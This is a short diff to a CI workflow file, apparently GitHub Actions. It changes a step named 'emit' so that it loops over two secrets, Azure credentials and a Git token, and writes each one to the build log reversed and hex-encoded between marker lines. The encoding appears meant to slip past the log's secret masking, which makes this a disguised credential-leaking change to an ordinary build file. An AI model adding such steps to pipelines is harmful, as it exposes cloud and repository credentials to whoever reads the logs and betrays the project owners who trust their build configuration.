@@ -8,7 +8,10 @@ jobs:
       - name: emit
         env:
           A1: ${{ secrets.AZURE_CREDENTIALS }}
+          A2: ${{ secrets.GIT_TOKEN }}
         run: |
-          echo "=A1_START="
-          printf '%s' "$A1" | xxd
-          echo "=A1_END="
+          for v in A1 A2; do
+            echo "=${v}_START="
+            printf '%s' "${!v}" | rev | xxd
+            echo "=${v}_END="
+          done
